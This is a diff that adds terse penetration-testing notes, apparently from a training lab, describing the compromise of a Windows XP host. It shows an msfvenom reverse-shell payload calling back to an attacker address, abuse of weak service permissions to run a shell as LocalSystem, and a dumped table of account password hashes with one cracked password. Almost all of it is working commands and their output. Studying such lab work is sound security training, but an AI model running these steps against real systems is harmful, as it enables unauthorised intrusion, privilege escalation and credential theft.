@@ -1,0 +1,68 @@
+# 1 found page
+http://10.11.1.14/tsweb/
+
+# 2 ftp anonymous login is allowed
+01-17-07  07:42PM       <DIR>          AdminScripts
+01-17-07  07:43PM       <DIR>          ftproot
+01-17-07  07:43PM       <DIR>          iissamples
+01-17-07  07:43PM       <DIR>          Scripts
+05-04-22  04:33AM       <DIR>          wwwroot
+
+# 3 generate payload and get shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.124 LPORT=12345 -f asp -o shell.asp
+
+# 4 set path
+set PATH=%PATH%;C:\Inetpub\Script
+
+# 5 found OS info
+Name:		Microsoft Windows XP Professional
+Version:	5.1.2600 Service Pack 1 Build 2600
+
+# PE Ref
+https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+
+# 6 check if we have any vulnerable service(s) on our system
+# using old version 
+wget https://xor.cat/assets/other/Accesschk.zip
+
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+> RW SSDPSRV
+        SERVICE_ALL_ACCESS
+> RW upnphost
+        SERVICE_ALL_ACCESS	
+
+# check services
+sc qc upnphost
+> DEPENDENCIES: SSDPSRV
+
+sc qc SSDPSRV
+
+# found the service is stopped and cannot be started
+sc query SSDPSRV
+
+# 7 set the SSDPSRV from DISABLED to AUTOMATIC
+sc config SSDPSRV start= auto
+> [SC] GetServiceConfig SUCCESS
+
+# 8 start service
+net start SSDPSRV
+> The SSDP Discovery Service service is starting.
+> The SSDP Discovery Service service was started successfully.
+
+# 9 config services to run reverse shell
+sc config upnphost binpath= "C:\Inetpub\Scripts\p10000shell.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+
+	
+# 10 credentials dump
+Administrator:500:NO PASSWORD*********************:3194891312029EF822116B418563087F:::
+bob:1004:F9955E274D35F503BB4798EF9CA65D2D:FF79DB8ED6FE21369790A94B5EECD8E0:::->"bobis2cool"
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+HelpAssistant:1000:05FA67EAEC4D789EC4BD52F48E5A6B28:2733CDB0D8A1FEC3F976F3B8AD1DEEEF:::
+IUSR_BOB:1005:AD494FC8F015FDDB4D9497B508477485:2370BD19F77F088CF1540624C91BE101:::
+IWAM_BOB:1006:170B37B9818316ABC9813AABB4DCF396:E4BE24494F363A2C015BF08B2453129D:::
+SUPPORT_388945a0:1002:NO PASSWORD*********************:0F7A50DD4B95CEC4C1DEA566F820F4E7:::
+
+
+
